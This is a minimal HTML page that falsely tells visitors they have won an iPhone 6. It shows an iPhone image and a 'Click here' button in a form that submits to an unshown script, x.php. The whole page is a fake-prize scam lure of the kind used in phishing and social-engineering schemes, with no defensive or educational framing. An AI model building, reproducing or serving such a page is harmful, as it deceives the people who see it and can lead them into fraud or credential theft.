<html>
<head>
	<title></title>
</head>
<body>
<img src="iPhone.png" height="42" width="42">

Congratulation you have won a iphone 6 .Click below to claim your iphone
<form action="x.php">
	<button>Click here</button>
</form>

</body>
</html>